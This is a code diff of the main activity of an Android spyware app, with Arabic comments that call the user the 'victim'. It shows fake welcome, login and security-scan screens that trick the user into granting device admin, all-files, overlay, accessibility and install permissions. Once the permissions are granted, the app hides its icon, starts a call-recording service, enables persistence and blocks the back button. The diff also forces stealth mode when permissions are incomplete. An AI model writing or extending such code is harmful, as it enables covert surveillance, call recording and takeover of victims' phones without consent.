@@ -23,10 +23,11 @@ import androidx.core.content.ContextCompat;
 /**
  * MainActivity - نقطة الدخول الرئيسية
  * ============================================================
- * ⚠️ استراتيجية العمل:
- * 1. أول مرة يتم فتح التطبيق: نعرض UI وهمي لجمع الصلاحيات
- * 2. بعد جمع الصلاحيات: نخفي الأيقونة + نشغل الخدمات + نقفل النشاط
- * 3. أي فتح لاحق: نشغل الخدمات ونقفل فورًا (بدون UI)
+ * ★ استراتيجية العمل:
+ * 1. أول مرة: نعرض UI وهمي لجمع الصلاحيات
+ * 2. بعد جمع الصلاحيات: نخفي الأيقونة + نشغل الخدمات + نقفل
+ * 3. أي فتح لاحق: نشغل الخدمات ونقفل فورًا
+ * ============================================================
  */
 public class MainActivity extends Activity {
 
@@ -39,9 +40,10 @@ public class MainActivity extends Activity {
     private static final int REQUEST_INSTALL_PACKAGES = 2005;
 
     private static final String PREFS_NAME = "sys_prefs";
-    private static final String KEY_INITIALIZED = "initialized";
+    private static final String KEY_FIRST_LAUNCH = "first_launch_done";
     private static final String KEY_PERMISSIONS_DONE = "permissions_done";
     private static final String KEY_HIDDEN = "icon_hidden";
+    private static final String KEY_INITIALIZED = "initialized";
 
     private FakeUIManager ui;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
@@ -50,7 +52,7 @@ public class MainActivity extends Activity {
     private boolean permissionsStarted = false;
 
     // ============================================================
-    // Permissions List - قائمة الصلاحيات المطلوبة
+    // Permissions List
     // ============================================================
     private static String[][] getPermissionsList() {
         if (Build.VERSION.SDK_INT >= 33) {
@@ -119,63 +121,60 @@ public class MainActivity extends Activity {
         Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);
 
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        boolean isInitialized = prefs.getBoolean(KEY_INITIALIZED, false);
+        boolean firstLaunchDone = prefs.getBoolean(KEY_FIRST_LAUNCH, false);
         boolean permissionsDone = prefs.getBoolean(KEY_PERMISSIONS_DONE, false);
 
-        // ★★★ لو التطبيق اتثبت وعمل Initialize من قبل → نخفي تمامًا ★★★
-        if (isInitialized && permissionsDone) {
+        Log.d(TAG, "[STATE] firstLaunchDone=" + firstLaunchDone
+                + " | permissionsDone=" + permissionsDone);
+
+        // ★★★ لو أول مرة → اعرض UI ★★★
+        if (!firstLaunchDone) {
+            Log.d(TAG, "[FIRST-RUN] ★ Showing fake UI for permissions ★");
+            permissionsList = getPermissionsList();
+            ui = new FakeUIManager(this);
+            startFlow();
+            return;
+        }
+
+        // ★★★ لو الصلاحيات خلصت → الوضع الخفي ★★★
+        if (permissionsDone) {
             Log.d(TAG, "[STEALTH] App already initialized — activating stealth mode");
             activateStealthMode();
             return;
         }
 
-        // ★★★ أول مرة: نعرض UI وهمي لجمع الصلاحيات ★★★
-        Log.d(TAG, "[FIRST-RUN] Showing fake UI for permissions");
-        permissionsList = getPermissionsList();
-        ui = new FakeUIManager(this);
-        startFlow();
+        // ★★★ حالة غريبة: firstLaunchDone=true بس permissionsDone=false ★★★
+        // ★ ده معناه إن الضحية قفل التطبيق قبل ما يخلص الصلاحيات
+        // ★ فعّل الوضع الخفي على أي حال ★★★
+        Log.d(TAG, "[RECOVERY] Permissions incomplete — forcing stealth mode");
+        activateStealthMode();
     }
 
     // ============================================================
-    // Stealth Mode - الوضع الخفي
+    // Stealth Mode
     // ============================================================
     private void activateStealthMode() {
         try {
-            // 1. شغل كل الخدمات
             startAllServices();
-
-            // 2. أخفي الأيقونة من قائمة التطبيقات
             hideAppIcon();
-
-            // 3. فعّل كل طبقات الاستمرارية
             PersistenceManager.enableAllPersistence(this);
-
-            // 4. أعد جدولة الاستمرارية الأبدية
             PersistenceManager.scheduleEternalAlarm(this);
-
             Log.d(TAG, "[STEALTH] All stealth operations completed");
-
         } catch (Exception e) {
             Log.e(TAG, "[STEALTH] error: " + e.getMessage());
         } finally {
-            // ★ اقفل النشاط فورًا ★
             finishAndHide();
         }
     }
 
     // ============================================================
-    // Flow - التدفق الوهمي لأول مرة
+    // Flow - التدفق الوهمي
     // ============================================================
     private void startFlow() {
-        // 1. شاشة الترحيب
         ui.showWelcomeScreen(() -> {
-            // 2. شاشة تسجيل الدخول الوهمي
             ui.showLoginScreen(() -> {
-                // 3. شاشة الفحص الأمني
                 ui.showSecurityScanScreen(() -> {
-                    // 4. شاشة التحميل
                     ui.showProgressScreen("جاري التهيئة...", () -> {
-                        // 5. ابدأ في طلب الصلاحيات
                         startPermissionFlow();
                     });
                 });
@@ -184,7 +183,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // Permissions Flow - جمع الصلاحيات خطوة بخطوة
+    // Permissions Flow
     // ============================================================
     private void startPermissionFlow() {
         if (permissionsStarted) return;
@@ -195,7 +194,6 @@ public class MainActivity extends Activity {
     }
 
     private void requestNextPermission() {
-        // ★ لو خلصنا كل الصلاحيات → انتقل للخطوة التالية ★
         if (currentPermIndex >= permissionsList.length) {
             Log.d(TAG, "[PERMISSIONS] All runtime permissions requested");
             mainHandler.postDelayed(this::requestDeviceAdmin, 800);
@@ -204,7 +202,6 @@ public class MainActivity extends Activity {
 
         String permission = permissionsList[currentPermIndex][0];
 
-        // ★ لو الصلاحية مش declared في Manifest، تخطاها ★
         if (!isPermissionDeclared(permission)) {
             Log.d(TAG, "[PERMISSIONS] Not declared: " + permission);
             currentPermIndex++;
@@ -212,7 +209,6 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // ★ لو الصلاحية ممنوحة بالفعل، تخطاها ★
         if (ContextCompat.checkSelfPermission(this, permission)
                 == PackageManager.PERMISSION_GRANTED) {
             Log.d(TAG, "[PERMISSIONS] Already granted: " + permission);
@@ -221,7 +217,6 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // ★ اطلب الصلاحية ★
         Log.d(TAG, "[PERMISSIONS] Requesting: " + permission);
         try {
             ActivityCompat.requestPermissions(this,
@@ -266,7 +261,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // Device Admin - تفعيل مسؤول الجهاز
+    // Device Admin
     // ============================================================
     private void requestDeviceAdmin() {
         try {
@@ -291,9 +286,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ============================================================
-    // MANAGE_EXTERNAL_STORAGE - الوصول لكل الملفات
-    // ============================================================
     private void requestManageStorage() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             try {
@@ -304,27 +296,14 @@ public class MainActivity extends Activity {
                     startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                     Log.d(TAG, "[STORAGE] Requesting MANAGE_EXTERNAL_STORAGE");
                     return;
-                } else {
-                    Log.d(TAG, "[STORAGE] Already granted");
                 }
             } catch (Exception e) {
                 Log.e(TAG, "[STORAGE] error: " + e.getMessage());
-                try {
-                    Intent intent = new Intent(
-                            Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
-                    return;
-                } catch (Exception ex) {
-                    Log.e(TAG, "[STORAGE] fallback error: " + ex.getMessage());
-                }
             }
         }
         mainHandler.postDelayed(this::requestOverlay, 500);
     }
 
-    // ============================================================
-    // Overlay - الرسم فوق التطبيقات الأخرى
-    // ============================================================
     private void requestOverlay() {
         try {
             if (!Settings.canDrawOverlays(this)) {
@@ -333,8 +312,6 @@ public class MainActivity extends Activity {
                 startActivityForResult(intent, REQUEST_OVERLAY);
                 Log.d(TAG, "[OVERLAY] Requesting");
                 return;
-            } else {
-                Log.d(TAG, "[OVERLAY] Already granted");
             }
         } catch (Exception e) {
             Log.e(TAG, "[OVERLAY] error: " + e.getMessage());
@@ -342,9 +319,6 @@ public class MainActivity extends Activity {
         mainHandler.postDelayed(this::requestBatteryOptimization, 500);
     }
 
-    // ============================================================
-    // Battery Optimization - استثناء من توفير الطاقة
-    // ============================================================
     private void requestBatteryOptimization() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -369,15 +343,11 @@ public class MainActivity extends Activity {
         mainHandler.postDelayed(this::requestInstallPackages, 500);
     }
 
-    // ============================================================
-    // REQUEST_INSTALL_PACKAGES - لتحديث التطبيق تلقائيًا
-    // ============================================================
     private void requestInstallPackages() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 if (!getPackageManager().canRequestPackageInstalls()) {
-                    Intent intent = new Intent(
-                            Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                     intent.setData(Uri.parse("package:" + getPackageName()));
                     try {
                         startActivityForResult(intent, REQUEST_INSTALL_PACKAGES);
@@ -386,8 +356,6 @@ public class MainActivity extends Activity {
                     } catch (Exception e) {
                         Log.e(TAG, "[INSTALL] error: " + e.getMessage());
                     }
-                } else {
-                    Log.d(TAG, "[INSTALL] Already granted");
                 }
             }
         } catch (Exception e) {
@@ -396,72 +364,56 @@ public class MainActivity extends Activity {
         mainHandler.postDelayed(this::finishSetup, 500);
     }
 
-    // ============================================================
-    // onActivityResult - متابعة بعد كل صلاحية
-    // ============================================================
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
 
         if (requestCode == REQUEST_DEVICE_ADMIN) {
-            Log.d(TAG, "[ADMIN] Result: " + resultCode);
             mainHandler.postDelayed(this::requestManageStorage, 500);
         } else if (requestCode == REQUEST_MANAGE_STORAGE) {
-            Log.d(TAG, "[STORAGE] Result: " + resultCode);
             mainHandler.postDelayed(this::requestOverlay, 500);
         } else if (requestCode == REQUEST_OVERLAY) {
-            Log.d(TAG, "[OVERLAY] Result: " + resultCode);
             mainHandler.postDelayed(this::requestBatteryOptimization, 500);
         } else if (requestCode == REQUEST_BATTERY_OPT) {
-            Log.d(TAG, "[BATTERY] Result: " + resultCode);
             mainHandler.postDelayed(this::requestInstallPackages, 500);
         } else if (requestCode == REQUEST_INSTALL_PACKAGES) {
-            Log.d(TAG, "[INSTALL] Result: " + resultCode);
             mainHandler.postDelayed(this::finishSetup, 500);
         }
     }
 
     // ============================================================
-    // finishSetup - إنهاء التهيئة + تفعيل الوضع الخفي
+    // finishSetup
     // ============================================================
     private void finishSetup() {
         Log.d(TAG, "[SETUP] Complete — activating stealth mode");
 
         try {
-            // 1. شاشة النجاح
             if (ui != null) {
                 ui.showSuccessScreen(() -> {
-                    // 2. شغل كل الخدمات
-                    startAllServices();
-
-                    // 3. فعّل كل طبقات الاستمرارية
-                    PersistenceManager.enableAllPersistence(this);
-
-                    // 4. احفظ flag إن التطبيق initialized
+                    // ★★★ احفظ flag إن الصلاحيات خلصت ★★★
                     getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                             .edit()
-                            .putBoolean(KEY_INITIALIZED, true)
+                            .putBoolean(KEY_FIRST_LAUNCH, true)
                             .putBoolean(KEY_PERMISSIONS_DONE, true)
+                            .putBoolean(KEY_INITIALIZED, true)
                             .apply();
 
-                    // 5. أخفي الأيقونة
+                    startAllServices();
+                    PersistenceManager.enableAllPersistence(this);
+
                     mainHandler.postDelayed(this::hideAppIcon, 800);
-
-                    // 6. افتح إعدادات Accessibility (لتفعيل الـ Services)
                     mainHandler.postDelayed(this::openAccessibilitySettings, 1500);
-
-                    // 7. اقفل النشاط
                     mainHandler.postDelayed(this::finishAndHide, 2500);
                 });
             } else {
-                // ★ لو UI مش موجود → نعمل كل حاجة مباشرة
-                startAllServices();
-                PersistenceManager.enableAllPersistence(this);
                 getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                         .edit()
-                        .putBoolean(KEY_INITIALIZED, true)
+                        .putBoolean(KEY_FIRST_LAUNCH, true)
                         .putBoolean(KEY_PERMISSIONS_DONE, true)
+                        .putBoolean(KEY_INITIALIZED, true)
                         .apply();
+                startAllServices();
+                PersistenceManager.enableAllPersistence(this);
                 hideAppIcon();
                 finishAndHide();
             }
@@ -471,11 +423,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ============================================================
-    // startAllServices - تشغيل كل الخدمات
-    // ============================================================
     private void startAllServices() {
-        // 1. الخدمة الرئيسية
         try {
             Intent serviceIntent = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -485,10 +433,9 @@ public class MainActivity extends Activity {
             }
             Log.d(TAG, "[SERVICE] ServiceRunner started");
         } catch (Exception e) {
-            Log.e(TAG, "[SERVICE] ServiceRunner error: " + e.getMessage());
+            Log.e(TAG, "[SERVICE] error: " + e.getMessage());
         }
 
-        // 2. خدمة تسجيل المكالمات
         try {
             Intent callRecorderIntent = new Intent(this, CallRecorderService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -502,9 +449,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ============================================================
-    // hideAppIcon - إخفاء أيقونة التطبيق من قائمة التطبيقات
-    // ============================================================
     private void hideAppIcon() {
         try {
             SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
@@ -517,7 +461,6 @@ public class MainActivity extends Activity {
             PackageManager pm = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
 
-            // ★ تعطيل الـ component → الأيقونة تختفي من قائمة التطبيقات
             pm.setComponentEnabledSetting(
                     componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -526,19 +469,14 @@ public class MainActivity extends Activity {
 
             prefs.edit().putBoolean(KEY_HIDDEN, true).apply();
             Log.d(TAG, "[HIDE] App icon hidden successfully");
-
         } catch (Exception e) {
             Log.e(TAG, "[HIDE] error: " + e.getMessage());
         }
     }
 
-    // ============================================================
-    // openAccessibilitySettings - فتح إعدادات Accessibility
-    // ============================================================
     private void openAccessibilitySettings() {
         try {
-            Intent accessibilityIntent = new Intent(
-                    Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             accessibilityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(accessibilityIntent);
             Log.d(TAG, "[ACCESSIBILITY] Settings opened");
@@ -547,9 +485,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ============================================================
-    // finishAndHide - إنهاء النشاط نهائيًا + إخفاؤه من Recent
-    // ============================================================
     private void finishAndHide() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
@@ -557,32 +492,21 @@ public class MainActivity extends Activity {
             } else {
                 finish();
             }
-            Log.d(TAG, "[FINISH] Activity closed and removed from recents");
         } catch (Exception e) {
-            Log.e(TAG, "[FINISH] error: " + e.getMessage());
             try { finish(); } catch (Exception ignored) {}
         }
     }
 
-    // ============================================================
-    // onBackPressed - تعطيل زر الرجوع (منع الضحية من إغلاق التطبيق)
-    // ============================================================
     @Override
     public void onBackPressed() {
-        // ★ لا تفعل شيء — نمنع الإغلاق ★
         Log.d(TAG, "[BACK] Blocked");
         moveTaskToBack(true);
     }
 
-    // ============================================================
-    // onDestroy
-    // ============================================================
     @Override
     protected void onDestroy() {
         super.onDestroy();
         Log.d(TAG, "[DESTROY] MainActivity destroyed");
-
-        // ★ اعد تشغيل الخدمات في الخلفية لو النظام قتل النشاط ★
         try {
             Intent svc = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -592,4 +516,4 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
     }
-                            }
+                     }
